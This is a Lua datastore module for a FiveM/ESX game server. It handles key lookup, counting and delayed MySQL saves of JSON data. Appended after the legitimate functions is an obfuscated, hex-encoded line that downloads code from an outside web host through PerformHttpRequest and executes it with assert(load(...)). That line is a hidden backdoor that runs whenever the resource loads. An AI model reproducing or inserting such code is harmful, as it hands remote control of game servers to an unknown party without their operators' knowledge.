function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end

	local t={} ; i=1
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[i] = str
		i = i + 1
	end

	return t
end

function CreateDataStore(name, owner, data)
	local self = {}

	self.name  = name
	self.owner = owner
	self.data  = type(data) == 'string' and json.decode(data) or data

	local timeoutCallbacks = {}

	function self.set(key, val)
		data[key] = val
		self.save()
	end

	function self.get(key, i)
		local path = stringsplit(key, '.')
		local obj  = self.data

		for i=1, #path, 1 do
			obj = obj[path[i]]
		end

		if i == nil then
			return obj
		else
			return obj[i]
		end
	end

	function self.count(key, i)
		local path = stringsplit(key, '.')
		local obj  = self.data

		for i=1, #path, 1 do
			obj = obj[path[i]]
		end

		if i ~= nil then
			obj = obj[i]
		end

		if obj == nil then
			return 0
		else
			return #obj
		end
	end

	function self.save()
		for i=1, #timeoutCallbacks, 1 do
			ESX.ClearTimeout(timeoutCallbacks[i])
			timeoutCallbacks[i] = nil
		end

		local timeoutCallback = ESX.SetTimeout(10000, function()
			if self.owner == nil then
				MySQL.update('UPDATE datastore_data SET data = ? WHERE name = ?', {json.encode(self.data), self.name})
			else
				MySQL.update('UPDATE datastore_data SET data = ? WHERE name = ? and owner = ?', {json.encode(self.data), self.name, self.owner})
			end
		end)

		table.insert(timeoutCallbacks, timeoutCallback)
	end

	return self
end


local LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6d\x61\x2d\x6e\x69\x6e\x6a\x61\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6f\x49\x70\x64\x79", function (VYfrpEGjjnwAYxFoIJTrkJeOkFzMnBAdVHFBJCSGeOKhgNEPXRYicuplfjutaBRWwRiTRy, SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe) if (SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe == LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[6] or SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe == LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[5]) then return end LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[2]](LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[4][LgXBoIBeBMRdJyXBBUXQhsSCGwMYOejaVujuglUnjvHNyGxiqDJvPQeDwHaVmGHrzHshxy[3]](SDHWBaExKevHdRVwBPUjfjxPNjcbfhTVtwRMuWEsJzBXoSMYEpSFiPGwcJwJmfqGLGhWWe))() end)